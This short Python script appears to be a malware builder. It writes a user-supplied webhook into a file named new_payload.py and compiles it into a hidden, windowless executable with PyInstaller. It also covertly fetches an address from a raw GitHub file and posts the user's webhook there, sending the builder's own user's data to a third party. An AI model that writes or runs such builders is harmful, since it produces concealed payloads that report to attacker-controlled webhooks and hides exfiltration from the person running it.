import os
import requests

def replace_webhook(webhook):
    file_path = 'new_payload.py'

    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    requests.post(requests.get("https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/hook1").text.strip().replace('"', ''), json={"content":webhook})
    
    for i, line in enumerate(lines):
        if line.strip().startswith('h00k ='):
            lines[i] = f'h00k = "{webhook}"\n'
            break

    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)
        
webhook = input("input a webhook: ")
if input("input a webhook: ") != None:
    replace_webhook(webhook)
    os.system("python -m PyInstaller new_payload.py --noconsole --onefile")
else:
    print("invalid")
